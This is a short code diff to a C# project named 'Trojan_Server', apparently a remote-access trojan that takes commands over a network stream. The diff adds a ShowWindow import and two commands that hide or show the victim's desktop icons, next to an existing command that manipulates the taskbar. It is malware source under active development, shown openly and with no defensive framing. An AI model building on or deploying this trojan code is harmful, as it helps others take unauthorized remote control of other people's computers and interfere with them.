@@ -30,6 +30,8 @@ namespace Trojan_Server
         string lpClassName,   
         string lpWindowName    
         );
+        [DllImport("user32.dll")]
+		public static extern int ShowWindow(int Wnd, int Flags);
 
         public static NetworkStream Reciver;
         [DllImport("kernel32.dll")]
@@ -85,6 +87,12 @@ namespace Trojan_Server
                             int TaskBarHwnds;
                             TaskBarHwnds = FindWindow("Shell_traywnd", "");
                             SetWindowPos(TaskBarHwnds, 0, 0, 0, 0, 0, SWP_SHOWWINDOW);
+                            break;
+                        case "HIDEDESKTOPICONS":
+                            ShowWindow(FindWindow("Progman", "Program Manager"), 0);
+                            break;
+                        case "SHOWDESKTOPICONS":
+                            ShowWindow(FindWindow("Progman", "Program Manager"), 1);
                             break;
                     }
                 }
